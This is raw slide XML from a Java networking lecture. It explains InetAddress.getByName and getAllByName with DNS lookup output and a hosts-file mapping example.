                </a:solidFill>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>InetAddress</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" sz="1600" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t> address = </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" sz="1600" b="1" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>InetAddress.getByName</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" sz="1600" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>(host);</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" altLang="zh-CN" sz="1600" b="1" dirty="0">
              <a:solidFill>
                <a:srgbClr val="000000"/>
              </a:solidFill>
              <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcBef>
                <a:spcPct val="0"/>
              </a:spcBef>
              <a:buClrTx/>
              <a:buSzTx/>
              <a:buFontTx/>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" sz="1600" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>        </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" sz="1600" b="1" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>System.out.println</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" sz="1600" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>("IP Address: " + </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" sz="1600" b="1" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>address.getHostAddress</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" sz="1600" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>());</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" altLang="zh-CN" sz="1600" b="1" dirty="0">
              <a:solidFill>
                <a:srgbClr val="000000"/>
              </a:solidFill>
              <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcBef>
                <a:spcPct val="0"/>
              </a:spcBef>
              <a:buClrTx/>
              <a:buSzTx/>
              <a:buFontTx/>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" sz="1600" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>        </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" sz="1600" b="1" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>System.out.println</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" sz="1600" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>("Hostname: " + </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" sz="1600" b="1" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>address.getHostName</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" sz="1600" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>());</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" altLang="zh-CN" sz="1600" b="1" dirty="0">
              <a:solidFill>
                <a:srgbClr val="000000"/>
              </a:solidFill>
              <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcBef>
                <a:spcPct val="0"/>
              </a:spcBef>
              <a:buClrTx/>
              <a:buSzTx/>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" sz="1600" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>	</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" altLang="zh-CN" sz="1600" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>System.out.println(address);</a:t>
            </a:r>
            <a:endParaRPr lang="en-GB" altLang="zh-CN" sz="1600" b="1" dirty="0">
              <a:solidFill>
                <a:srgbClr val="000000"/>
              </a:solidFill>
              <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcBef>
                <a:spcPct val="0"/>
              </a:spcBef>
              <a:buClrTx/>
              <a:buSzTx/>
              <a:buFontTx/>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" sz="1600" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>    }</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" altLang="zh-CN" sz="1600" b="1" dirty="0">
              <a:solidFill>
                <a:srgbClr val="000000"/>
              </a:solidFill>
              <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcBef>
                <a:spcPct val="0"/>
              </a:spcBef>
              <a:buClrTx/>
              <a:buSzTx/>
              <a:buFontTx/>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" sz="1600" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>}</a:t>
            </a:r>
            <a:endParaRPr lang="en-GB" altLang="zh-CN" sz="1600" b="1" dirty="0">
              <a:solidFill>
                <a:srgbClr val="000000"/>
              </a:solidFill>
              <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="2150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55369"/>
          <a:stretch>
            <a:fillRect/>
          </a:stretch>
        </p:blipFill>
        <p:spPr bwMode="auto">
          <a:xfrm>
            <a:off x="3352800" y="5829762"/>
            <a:ext cx="4495800"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457200" y="140971"/>
            <a:ext cx="8610600" cy="584775"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-GB" altLang="zh-CN" sz="3200" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="C00000"/>
                </a:solidFill>
                <a:latin typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              </a:rPr>
              <a:t>getByName </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" altLang="en-US" sz="3200" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="C00000"/>
                </a:solidFill>
                <a:latin typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              </a:rPr>
              <a:t>method usage example</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="3" name="Rectangle 2"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="3352800" y="5128704"/>
            <a:ext cx="6096000" cy="646331"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
        <p:txBody>
          <a:bodyPr>
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>IP Address: 210.39.3.164</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" dirty="0"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>Hostname: www.szu.edu.cn</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546226" y="152400"/>
            <a:ext cx="7775575" cy="114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lvl="2" indent="-342900" algn="l">
              <a:lnSpc>
                <a:spcPct val="170000"/>
              </a:lnSpc>
              <a:defRPr/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-GB" altLang="zh-CN" sz="3200" b="1" kern="1200" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="C00000"/>
                </a:solidFill>
                <a:cs typeface="+mn-cs"/>
              </a:rPr>
              <a:t>getByName </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" altLang="en-US" sz="3200" b="1" kern="1200" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="C00000"/>
                </a:solidFill>
                <a:cs typeface="+mn-cs"/>
              </a:rPr>
              <a:t>method usage example</a:t>
            </a:r>
            <a:endParaRPr lang="en-GB" altLang="en-US" sz="3200" b="1" kern="1200" dirty="0">
              <a:solidFill>
                <a:srgbClr val="C00000"/>
              </a:solidFill>
              <a:cs typeface="+mn-cs"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="47107" name="Rectangle 3"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1" noChangeArrowheads="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="body" idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="685800" y="1295400"/>
            <a:ext cx="10820400" cy="2667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zh-CN" sz="2400" dirty="0"/>
              <a:t>java DNSLookup localhost</a:t>
            </a:r>
            <a:endParaRPr lang="en-GB" altLang="zh-CN" sz="2400" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr eaLnBrk="1" hangingPunct="1">
              <a:buFont typeface="Wingdings" panose="05000000000000000000" pitchFamily="2" charset="2"/>
              <a:buChar char="Ø"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-GB" altLang="en-US" sz="2400" dirty="0"/>
              <a:t>Running results:</a:t>
            </a:r>
            <a:endParaRPr lang="en-GB" altLang="en-US" sz="2400" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="1946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43307" b="18898"/>
          <a:stretch>
            <a:fillRect/>
          </a:stretch>
        </p:blipFill>
        <p:spPr bwMode="auto">
          <a:xfrm>
            <a:off x="1143000" y="2932330"/>
            <a:ext cx="4419600" cy="4966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900" b="0" i="0" u="none" strike="noStrike" cap="none" normalizeH="0" baseline="0">
                <a:ln>
                  <a:noFill/>
                </a:ln>
                <a:solidFill>
                  <a:srgbClr val="FFFFFF"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Arial Unicode MS" panose="020B0604020202020204" pitchFamily="34" charset="-128"/>
                <a:ea typeface="Menlo"/>
              </a:rPr>
              <a:t>IP Address: 142.250.190.46 Hostname: google.com</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Rectangle 2"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1066800" y="2260600"/>
            <a:ext cx="6096000" cy="646331"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
        <p:txBody>
          <a:bodyPr>
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>IP Address: 127.0.0.1</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" dirty="0"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>Hostname: localhost</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546226" y="152400"/>
            <a:ext cx="7775575" cy="114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lvl="2" indent="-342900" algn="l">
              <a:lnSpc>
                <a:spcPct val="170000"/>
              </a:lnSpc>
              <a:defRPr/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-GB" altLang="zh-CN" sz="3200" b="1" kern="1200" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="C00000"/>
                </a:solidFill>
                <a:cs typeface="+mn-cs"/>
              </a:rPr>
              <a:t>getByName </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" altLang="en-US" sz="3200" b="1" kern="1200" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="C00000"/>
                </a:solidFill>
                <a:cs typeface="+mn-cs"/>
              </a:rPr>
              <a:t>method usage example</a:t>
            </a:r>
            <a:endParaRPr lang="en-GB" altLang="en-US" sz="3200" b="1" kern="1200" dirty="0">
              <a:solidFill>
                <a:srgbClr val="C00000"/>
              </a:solidFill>
              <a:cs typeface="+mn-cs"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="47107" name="Rectangle 3"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1" noChangeArrowheads="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="body" idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="381000" y="1295400"/>
            <a:ext cx="11277600" cy="4419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400" dirty="0"/>
              <a:t>For the local machine, in addition to using the local machine name or </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" altLang="zh-CN" sz="2400" dirty="0"/>
              <a:t>localhost </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" altLang="en-US" sz="2400" dirty="0"/>
              <a:t>, you can also do an " </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" altLang="zh-CN" sz="2400" dirty="0"/>
              <a:t>IP/ </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" altLang="en-US" sz="2400" dirty="0"/>
              <a:t>domain name" mapping for the local machine in the </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" altLang="zh-CN" sz="2400" dirty="0"/>
              <a:t>hosts file (under Windows </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" altLang="en-US" sz="2400" dirty="0"/>
              <a:t>operating system). </a:t>
            </a:r>
            <a:endParaRPr lang="en-GB" altLang="en-US" sz="2400" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr eaLnBrk="1" hangingPunct="1">
              <a:buFont typeface="Wingdings" panose="05000000000000000000" pitchFamily="2" charset="2"/>
              <a:buChar char="Ø"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-GB" altLang="en-US" sz="2400" dirty="0"/>
              <a:t>This file is in </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" altLang="zh-CN" sz="2000" dirty="0"/>
              <a:t>C:\Windows\System32\drivers\etc </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" altLang="en-US" sz="2400" dirty="0"/>
              <a:t>. </a:t>
            </a:r>
            <a:endParaRPr lang="en-GB" altLang="en-US" sz="2400" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr eaLnBrk="1" hangingPunct="1">
              <a:buFont typeface="Wingdings" panose="05000000000000000000" pitchFamily="2" charset="2"/>
              <a:buChar char="Ø"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-GB" altLang="en-US" sz="2400" dirty="0"/>
              <a:t>Open </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" altLang="zh-CN" sz="2400" dirty="0"/>
              <a:t>hosts </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" altLang="en-US" sz="2400" dirty="0"/>
              <a:t>and add a line of string at the end as shown below:</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" altLang="zh-CN" sz="2400" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr eaLnBrk="1" hangingPunct="1">
              <a:buFont typeface="Wingdings" panose="05000000000000000000" pitchFamily="2" charset="2"/>
              <a:buChar char="Ø"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-GB" altLang="zh-CN" sz="2400" dirty="0"/>
              <a:t>192.168.18.100 www.mysite.com</a:t>
            </a:r>
            <a:endParaRPr lang="en-GB" altLang="zh-CN" sz="2400" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr eaLnBrk="1" hangingPunct="1">
              <a:buFont typeface="Wingdings" panose="05000000000000000000" pitchFamily="2" charset="2"/>
              <a:buChar char="Ø"/>
            </a:pPr>
            <a:endParaRPr lang="en-GB" altLang="zh-CN" sz="2400" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr eaLnBrk="1" hangingPunct="1">
              <a:buFont typeface="Wingdings" panose="05000000000000000000" pitchFamily="2" charset="2"/>
              <a:buChar char="Ø"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-GB" altLang="zh-CN" sz="2400" dirty="0"/>
              <a:t>java DNSLookup www.mysite.com</a:t>
            </a:r>
            <a:endParaRPr lang="en-GB" altLang="zh-CN" sz="2400" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr eaLnBrk="1" hangingPunct="1">
              <a:buFont typeface="Wingdings" panose="05000000000000000000" pitchFamily="2" charset="2"/>
              <a:buChar char="Ø"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-GB" altLang="en-US" sz="2400" dirty="0"/>
              <a:t>Operation results:</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" altLang="zh-CN" sz="2400" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="245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0" y="5682673"/>
            <a:ext cx="367347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762000" y="5068669"/>
            <a:ext cx="6096000" cy="646331"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
        <p:txBody>
          <a:bodyPr>
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>IP Address: 192.168.18.100</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" dirty="0">
              <a:solidFill>
                <a:srgbClr val="FF0000"/>
              </a:solidFill>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Hostname: www.mysite.com</a:t>
            </a:r>
            <a:endParaRPr lang="en-US"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107">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381000" y="475196"/>
            <a:ext cx="11430000" cy="83820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400" dirty="0"/>
              <a:t>To Display the IP address of </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" altLang="zh-CN" sz="2400" dirty="0">
                <a:hlinkClick r:id="rId1"/>
              </a:rPr>
              <a:t>www.oreilly.com : </a:t>
            </a:r>
            <a:endParaRPr lang="en-GB" altLang="zh-CN" sz="2400" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr eaLnBrk="1" hangingPunct="1">
              <a:buFont typeface="Wingdings" panose="05000000000000000000" pitchFamily="2" charset="2"/>
              <a:buChar char="Ø"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-GB" altLang="zh-CN" sz="2400" dirty="0">
                <a:hlinkClick r:id="rId1"/>
              </a:rPr>
              <a:t>Create an </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" altLang="zh-CN" sz="2400" dirty="0"/>
              <a:t>InetAddress </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" altLang="en-US" sz="2400" dirty="0"/>
              <a:t>object </a:t>
            </a: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zh-CN" altLang="en-US" sz="2400" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="2150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524000"/>
            <a:ext cx="9239250" cy="4020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图片 3"/>
          <p:cNvPicPr>
            <a:picLocks noChangeAspect="1"/>
          </p:cNvPicPr>
          <p:nvPr/>
        </p:nvPicPr>
        <p:blipFill rotWithShape="1">
          <a:blip r:embed="rId3">
            <a:extLst>
              <a:ext uri="{28A0092B-C50C-407E-A947-70E740481C1C}">
                <a14:useLocalDpi xmlns:a14="http://schemas.microsoft.com/office/drawing/2010/main" val="0"/>
              </a:ext>
            </a:extLst>
          </a:blip>
          <a:srcRect t="68762"/>
          <a:stretch>
            <a:fillRect/>
          </a:stretch>
        </p:blipFill>
        <p:spPr bwMode="auto">
          <a:xfrm>
            <a:off x="1676400" y="5715000"/>
            <a:ext cx="6553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304800" y="1295400"/>
            <a:ext cx="11506199" cy="4495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zh-CN" sz="2800" dirty="0"/>
              <a:t>getAllByName </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" altLang="en-US" sz="2800" dirty="0"/>
              <a:t>method can be used to obtain all </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" altLang="zh-CN" sz="2800" dirty="0"/>
              <a:t>IP addresses corresponding to a domain name from DNS </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" altLang="en-US" sz="2800" dirty="0"/>
              <a:t>. </a:t>
            </a:r>
            <a:endParaRPr lang="en-GB" altLang="en-US" sz="2800" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr eaLnBrk="1" hangingPunct="1">
              <a:buFont typeface="Wingdings" panose="05000000000000000000" pitchFamily="2" charset="2"/>
              <a:buChar char="Ø"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-GB" altLang="en-US" sz="2800" dirty="0"/>
              <a:t>This method returns an array of </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" altLang="zh-CN" sz="2800" dirty="0"/>
              <a:t>InetAddress </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" altLang="en-US" sz="2800" dirty="0"/>
              <a:t>type. The definition of this method is as follows:</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" altLang="zh-CN" sz="2800" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr eaLnBrk="1" hangingPunct="1">
              <a:buFont typeface="Wingdings 2" panose="05020102010507070707" pitchFamily="18" charset="2"/>
              <a:buNone/>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r>
              <a:rPr lang="en-GB" altLang="en-US" sz="2400" dirty="0"/>
              <a:t>Like the </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" altLang="zh-CN" sz="2400" dirty="0"/>
              <a:t>getByName </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" altLang="en-US" sz="2400" dirty="0"/>
              <a:t>method, </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" altLang="zh-CN" sz="2400" dirty="0"/>
              <a:t>getAllByName </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" altLang="en-US" sz="2400" dirty="0"/>
              <a:t>will also throw an </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" altLang="zh-CN" sz="2400" dirty="0"/>
              <a:t>UnknowHostException when the host </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" altLang="en-US" sz="2400" dirty="0"/>
              <a:t>does not exist, and </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" altLang="zh-CN" sz="2400" dirty="0"/>
              <a:t>getAllByName </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" altLang="en-US" sz="2400" dirty="0"/>
              <a:t>will not verify whether </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" altLang="zh-CN" sz="2400" dirty="0"/>
              <a:t>the IP </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" altLang="en-US" sz="2400" dirty="0"/>
              <a:t>address exists.</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" altLang="zh-CN" sz="2400" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="4" name="矩形 3"/>
          <p:cNvSpPr>
            <a:spLocks noChangeArrowheads="1"/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr bwMode="auto">
          <a:xfrm>
            <a:off x="350983" y="3352800"/>
            <a:ext cx="11582400" cy="40011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b="1" dirty="0">
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>public static InetAddress[] getAllByName(String host) throws UnknownHostException</a:t>
            </a:r>
            <a:endParaRPr lang="en-GB" altLang="zh-CN" sz="2000" b="1" dirty="0">
              <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="2" name="Rectangle 1"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="457200" y="228600"/>
            <a:ext cx="7162800" cy="830997"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-GB" altLang="zh-CN" sz="2400" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="C00000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>2. getAllByName </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" altLang="en-US" sz="2400" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="C00000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Method</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US" sz="2400" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="C00000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>: Get All IPs for a Host </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US" sz="2400" b="1" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="C00000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>i,e</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US" sz="2400" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="C00000"/>
                </a:solidFill>
              </a:rPr>
              <a:t> Multiple IP’s IPV4 and IPV6 </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US" sz="2400" b="1" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="C00000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>etc</a:t>
            </a:r>
            <a:endParaRPr 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
        <p:nvSpPr>
          <p:cNvPr id="5" name="Rectangle 4"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="745836" y="1143000"/>
            <a:ext cx="9906000" cy="4154984"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" sz="2400" b="1" dirty="0"/>
              <a:t>import </a:t>
